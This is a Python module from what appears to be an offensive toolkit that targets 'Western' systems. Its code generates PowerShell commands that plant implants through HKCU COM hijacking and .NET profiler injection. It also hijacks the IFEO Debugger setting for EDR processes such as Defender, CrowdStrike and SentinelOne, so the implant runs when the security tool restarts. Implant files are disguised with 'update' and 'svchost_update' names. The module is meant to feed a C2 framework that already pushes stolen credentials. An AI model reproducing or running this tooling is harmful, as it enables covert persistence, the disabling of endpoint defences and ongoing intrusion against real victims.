"""PHANTOMKERNEL persistence modules — post-exploitation for Western targets.

Per gap analysis item 31: Integrate PHANTOMKERNEL persistence modules as
post-exploitation modules. The C2 connector dispatch already pushes
credentials — extend it to also queue a persistence install task.

Three persistence anchors for Western EDRs (Defender, CrowdStrike, SentinelOne):
1. COM hijacking (HKCU, empty CLSID) — Defender doesn't check HKCU COM hijacking well
2. .NET profiler hooks (COR_ENABLE_PROFILING) — Defender doesn't check env vars
3. IFEO Debugger hijack for the EDR's own process — when EDR restarts, implant runs

These are integration stubs that generate the persistence configurations.
The actual implant execution is handled by the C2 framework (Cobalt Strike,
Mythic, Sliver).

Usage:
    from dropoutjeep_lib.utils.persistence import COMHijackPersistence, NetProfilerPersistence, IFEOFersistence
    com = COMHijackPersistence()
    com.generate_config(target_clsid='{XXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}', dll_path='C:\\temp\\implant.dll')
"""

import base64
import json
import logging
import os
import random
import string
import struct
from typing import Optional

logger = logging.getLogger("dropoutjeep")


class PersistenceModule:
    """Base class for persistence modules."""

    name = "base"
    description = "Base persistence module"

    def generate_config(self, **kwargs) -> dict:
        """Generate persistence configuration for the C2 to deploy."""
        raise NotImplementedError

    def generate_install_command(self, config: dict) -> str:
        """Generate the command/script to install this persistence."""
        raise NotImplementedError

    def generate_remove_command(self, config: dict) -> str:
        """Generate the command/script to remove this persistence."""
        raise NotImplementedError


class COMHijackPersistence(PersistenceModule):
    """COM hijacking persistence — HKCU, empty CLSID.

    Western EDRs (Defender, CrowdStrike, SentinelOne) check Run keys,
    scheduled tasks, WMI, and COM hijacking in HKLM. But HKCU COM hijacking
    is less monitored. We register a fake CLSID under HKCU that points to
    our DLL, and any process that instantiates that CLSID loads our DLL.

    Technique: T1546.015 (Event Triggered Execution: Component Object Model Hijacking)
    """

    name = "com_hijack"
    description = "COM hijacking via HKCU empty CLSID — weak Defender/CrowdStrike coverage"

    def generate_config(self, target_clsid: str = None, clsid: str = None, dll_path: str = None,
                       inproc_server: str = None, **kwargs) -> dict:
        target_clsid = target_clsid or clsid
        """Generate COM hijacking configuration.

        Args:
            target_clsid: CLSID to hijack (random if not provided)
            dll_path: Path to the implant DLL
            inproc_server: InprocServer32 registry value (defaults to dll_path)

        Returns:
            Config dict with registry keys and values to set.
        """
        if not target_clsid:
            # Generate a random CLSID-like identifier
            target_clsid = self._generate_fake_clsid()

        if not dll_path:
            dll_path = os.path.join(
                os.environ.get('TEMP', 'C:\\\\Windows\\\\Temp'),
                'update' + ''.join(random.choices(string.ascii_lowercase, k=4)) + '.dll'
            )

        inproc_server = inproc_server or dll_path

        config = {
            'technique': 'com_hijack',
            'clsid': target_clsid,
            'dll_path': dll_path,
            'registry_keys': [
                {
                    'path': f'HKCU\\Software\\Classes\\CLSID\\{target_clsid}',
                    'value': None,
                    'data': '',
                    'type': 'REG_SZ',
                },
                {
                    'path': f'HKCU\\Software\\Classes\\CLSID\\{target_clsid}\\InprocServer32',
                    'value': None,
                    'data': inproc_server,
                    'type': 'REG_SZ',
                },
                {
                    'path': f'HKCU\\Software\\Classes\\CLSID\\{target_clsid}\\InprocServer32',
                    'value': 'ThreadingModel',
                    'data': 'Apartment',
                    'type': 'REG_SZ',
                },
            ],
        }
        return config

    def generate_install_command(self, config: dict) -> str:
        """Generate PowerShell command to install COM hijacking persistence."""
        cmds = []
        for key in config['registry_keys']:
            path = key['path'].replace('HKCU', 'HKCU:')
            if key['value'] is None:
                cmds.append(
                    f"New-Item -Path '{path}' -Force | Out-Null;"
                    f"Set-ItemProperty -Path '{path}' -Name '(default)' -Value '{key['data']}' -Type {key['type']}"
                )
            else:
                cmds.append(
                    f"New-Item -Path '{path}' -Force | Out-Null;"
                    f"Set-ItemProperty -Path '{path}' -Name '{key['value']}' -Value '{key['data']}' -Type {key['type']}"
                )
        return "; ".join(cmds)

    def generate_remove_command(self, config: dict) -> str:
        """Generate PowerShell command to remove COM hijacking persistence."""
        clsid = config['clsid']
        return f"Remove-Item -Path 'HKCU:\\Software\\Classes\\CLSID\\{clsid}' -Recurse -Force"

    def _generate_fake_clsid(self) -> str:
        """Generate a random CLSID-formatted string."""
        parts = [
            ''.join(random.choices('0123456789ABCDEF', k=8)),
            ''.join(random.choices('0123456789ABCDEF', k=4)),
            ''.join(random.choices('0123456789ABCDEF', k=4)),
            ''.join(random.choices('0123456789ABCDEF', k=4)),
            ''.join(random.choices('0123456789ABCDEF', k=12)),
        ]
        return f'{{{parts[0]}-{parts[1]}-{parts[2]}-{parts[3]}-{parts[4]}}}'


class NetProfilerPersistence(PersistenceModule):
    """ .NET profiler hook persistence — COR_ENABLE_PROFILING.

    Western EDRs don't check environment variables for profiler injection.
    Setting COR_ENABLE_PROFILING=1 and COR_PROFILER=<CLSID> causes any .NET
    process to load our profiler DLL. Since many Windows processes use .NET,
    this provides broad execution.

    Technique: T1574.001 (Hijack Execution Flow: DLL Search Order Hijacking)
    combined with COR_PROFILER environment variable abuse.
    """

    name = "net_profiler"
    description = ".NET profiler hook — Defender doesn't check env vars"

    def generate_config(self, profiler_clsid: str = None,
                        profiler_dll: str = None,
                        registry_scope: str = 'HKCU', **kwargs) -> dict:
        """Generate .NET profiler persistence configuration.

        Args:
            profiler_clsid: CLSID for the profiler (random if not provided)
            profiler_dll: Path to the profiler DLL
            registry_scope: 'HKCU' or 'HKLM' (HKLM requires admin)

        Returns:
            Config dict with registry keys and environment variables.
        """
        com_hijack = COMHijackPersistence()
        if not profiler_clsid:
            profiler_clsid = com_hijack._generate_fake_clsid()

        if not profiler_dll:
            profiler_dll = os.path.join(
                os.environ.get('TEMP', 'C:\\\\Windows\\\\Temp'),
                'clr' + ''.join(random.choices(string.ascii_lowercase, k=4)) + '.dll'
            )

        config = {
            'technique': 'net_profiler',
            'profiler_clsid': profiler_clsid,
            'profiler_dll': profiler_dll,
            'scope': registry_scope,
            'environment_variables': [
                {'name': 'COR_ENABLE_PROFILING', 'value': '1', 'scope': registry_scope},
                {'name': 'COR_PROFILER', 'value': profiler_clsid, 'scope': registry_scope},
                {'name': 'COR_PROFILER_PATH', 'value': profiler_dll, 'scope': registry_scope},
            ],
            'registry_keys': [
                {
                    'path': f'{registry_scope}\\Software\\Classes\\CLSID\\{profiler_clsid}',
                    'value': None,
                    'data': '',
                    'type': 'REG_SZ',
                },
                {
                    'path': f'{registry_scope}\\Software\\Classes\\CLSID\\{profiler_clsid}\\InprocServer32',
                    'value': None,
                    'data': profiler_dll,
                    'type': 'REG_SZ',
                },
                {
                    'path': f'{registry_scope}\\Software\\Classes\\CLSID\\{profiler_clsid}\\InprocServer32',
                    'value': 'ThreadingModel',
                    'data': 'Both',
                    'type': 'REG_SZ',
                },
            ],
        }
        return config

    def generate_install_command(self, config: dict) -> str:
        """Generate PowerShell command to install .NET profiler persistence."""
        cmds = []
        scope = config['scope'].replace('HKCU', 'HKCU:').replace('HKLM', 'HKLM:')

        # Set environment variables via registry
        for env_var in config['environment_variables']:
            env_scope = env_var['scope'].replace('HKCU', 'HKCU:').replace('HKLM', 'HKLM:')
            cmds.append(
                f"setx {env_var['name']} \"{env_var['value']}\" /{(scope.split(':')[0].replace('HK', '')).lower()}"
            )

        # Register COM object
        for key in config['registry_keys']:
            path = key['path'].replace('HKCU', 'HKCU:').replace('HKLM', 'HKLM:')
            if key['value'] is None:
                cmds.append(
                    f"New-Item -Path '{path}' -Force | Out-Null;"
                    f"Set-ItemProperty -Path '{path}' -Name '(default)' -Value '{key['data']}'"
                )
            else:
                cmds.append(
                    f"New-Item -Path '{path}' -Force | Out-Null;"
                    f"Set-ItemProperty -Path '{path}' -Name '{key['value']}' -Value '{key['data']}'"
                )

        return "; ".join(cmds)

    def generate_remove_command(self, config: dict) -> str:
        """Generate PowerShell command to remove .NET profiler persistence."""
        clsid = config['profiler_clsid']
        scope = config['scope'].replace('HKCU', 'HKCU:').replace('HKLM', 'HKLM:')
        return (
            f"Remove-Item -Path '{scope}\\Software\\Classes\\CLSID\\{clsid}' -Recurse -Force; "
            f"setx COR_ENABLE_PROFILING \"\"; setx COR_PROFILER \"\"; setx COR_PROFILER_PATH \"\""
        )


class IFEOFersistence(PersistenceModule):
    """IFEO Debugger hijack persistence.

    Image File Execution Options (IFEO) Debugger hijack for the EDR's own
    process — when the EDR tries to restart, the implant runs instead.

    Western EDRs monitor their own process health and restart on failure.
    By setting the IFEO Debugger for the EDR's executable, when the EDR
    crashes/restarts, Windows launches our debugger (implant) instead.

    Technique: T1546.012 (Event Triggered Execution: Image File Execution Options)
    """

    name = "ifeo_debugger"
    description = "IFEO Debugger hijack — when EDR restarts, implant runs instead"

    # Western EDR process names
    EDR_PROCESSES = {
        'defender': {'exe': 'MsMpEng.exe', 'key': 'MsMpEng.exe'},
        'crowdstrike': {'exe': 'CSFalconService.exe', 'key': 'CSFalconService.exe'},
        'sentinelone': {'exe': 'SentinelAgent.exe', 'key': 'SentinelAgent.exe'},
        'carbon_black': {'exe': 'CbDefense.exe', 'key': 'CbDefense.exe'},
        'cisco_amp': {'exe': 'ampdaemon.exe', 'key': 'ampdaemon.exe'},
        'sysmon': {'exe': 'Sysmon64.exe', 'key': 'Sysmon64.exe'},
    }

    def generate_config(self, target_edr: str = 'defender',
                       implant_path: str = None, **kwargs) -> dict:
        """Generate IFEO Debugger hijack configuration.

        Args:
            target_edr: EDR to target ('defender', 'crowdstrike', 'sentinelone', etc.)
            implant_path: Path to the implant executable

        Returns:
            Config dict with registry keys to set.
        """
        edr_info = self.EDR_PROCESSES.get(target_edr)
        if not edr_info:
            raise ValueError(f"Unknown EDR: {target_edr}. Available: {list(self.EDR_PROCESSES.keys())}")

        if not implant_path:
            implant_path = os.path.join(
                os.environ.get('TEMP', 'C:\\\\Windows\\\\Temp'),
                'svchost_update' + ''.join(random.choices(string.ascii_lowercase, k=4)) + '.exe'
            )

        config = {
            'technique': 'ifeo_debugger',
            'target_edr': target_edr,
            'target_exe': edr_info['exe'],
            'implant_path': implant_path,
            'registry_keys': [
                {
                    'path': f'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{edr_info["key"]}',
                    'value': 'Debugger',
                    'data': implant_path,
                    'type': 'REG_SZ',
                },
            ],
        }
        return config

    def generate_install_command(self, config: dict) -> str:
        """Generate PowerShell command to install IFEO Debugger persistence."""
        cmds = []
        for key in config['registry_keys']:
            path = key['path'].replace('HKLM', 'HKLM:')
            cmds.append(
                f"New-Item -Path '{path}' -Force | Out-Null;"
                f"Set-ItemProperty -Path '{path}' -Name '{key['value']}' -Value '{key['data']}'"
            )
        return "; ".join(cmds)

    def generate_remove_command(self, config: dict) -> str:
        """Generate PowerShell command to remove IFEO Debugger persistence."""
        exe = config['target_exe']
        return f"Remove-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{exe}' -Name 'Debugger' -Force"


# Module registry for C2 connector dispatch
PERSISTENCE_MODULES = {
    'com_hijack': COMHijackPersistence,
    'net_profiler': NetProfilerPersistence,
    'ifeo_debugger': IFEOFersistence,
}


def generate_persistence_task(module_name: str, **kwargs) -> dict:
    """Generate a persistence task for the C2 to dispatch.

    Args:
        module_name: Persistence module name ('com_hijack', 'net_profiler', 'ifeo_debugger')
        **kwargs: Module-specific configuration

    Returns:
        Task dict with 'command', 'config', 'remove_command' for the C2.
    """
    module_class = PERSISTENCE_MODULES.get(module_name)
    if not module_class:
        raise ValueError(f"Unknown persistence module: {module_name}")

    module = module_class()
    config = module.generate_config(**kwargs)
    install_cmd = module.generate_install_command(config)
    remove_cmd = module.generate_remove_command(config)

    task = {
        'module': module_name,
        'command': install_cmd,
        'remove_command': remove_cmd,
        'config': config,
    }
    logger.info("Persistence task generated: module=%s", module_name)
    return task
